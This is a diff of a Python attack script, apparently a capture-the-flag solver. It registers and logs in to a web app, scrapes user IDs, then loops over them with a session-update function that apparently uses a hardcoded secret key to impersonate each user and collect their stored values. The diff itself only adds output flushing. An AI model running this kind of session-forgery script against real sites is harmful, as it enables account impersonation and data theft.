@@ -18,7 +18,7 @@ SECRET_KEY = 'y0u-w1ll-n3v3r-gu355'
 def retrieve_csrf_token(s: Session, url: str) -> str:
     data = s.get(url).text
     soup = BeautifulSoup(data, 'html.parser')
-    print(f'[+] Retrieved csrf_token from {url}')
+    print(f'[+] Retrieved csrf_token from {url}', flush=True)
     return soup.find(attrs={'id': 'csrf_token'})['value']
 
 
@@ -31,7 +31,7 @@ def register(s: Session, url: str) -> None:
         'password': PASSWORD,
         'submit': 'Submit'
     })
-    print('[+] Registered')
+    print('[+] Registered', flush=True)
 
 
 def login(s: Session, url: str) -> None:
@@ -43,14 +43,14 @@ def login(s: Session, url: str) -> None:
         'password': PASSWORD,
         'submit': 'Submit'
     })
-    print('[+] Logged in')
+    print('[+] Logged in', flush=True)
 
 
 def retrieve_users(s: Session, url: str) -> list:
     url += '/users'
     data = s.get(url).text
     soup = BeautifulSoup(data, 'html.parser')
-    print(f'[+] Retrieved users')
+    print(f'[+] Retrieved users', flush=True)
     return [user.text for user in soup.find_all(attrs={'scope': 'row'})]
 
 
@@ -69,7 +69,7 @@ def retrieve_cookie_links(s: Session, url: str) -> list:
     url += '/dashboard'
     data = s.get(url).text
     soup = BeautifulSoup(data, 'html.parser')
-    print(f'[+] Retrieved cookie links')
+    print(f'[+] Retrieved cookie links', flush=True)
     return [link['href'] for link in soup.find_all(attrs={'class': 'card-link'})]
 
 
@@ -82,7 +82,7 @@ def retrieve_cookies(s: Session, url: str) -> list:
         cookie_name = soup.find(attrs={'class': 'display-6'}).get_text()
         cookie_value = soup.find(attrs={'class': 'lead'}).get_text()
         cookies.append({cookie_name: cookie_value})
-    print(f'[+] Retrieved cookies')
+    print(f'[+] Retrieved cookies', flush=True)
     return cookies
 
 
@@ -97,9 +97,9 @@ def main() -> None:
         for user_id in users:
             update_session(s, url, user_id)
             cookies = retrieve_cookies(s, url)
-            print(cookies)
+            print(cookies, flush=True)
     except:
-        print('[-] Something went wrong')
+        print('[-] Something went wrong', flush=True)
 
 
 if __name__ == '__main__':
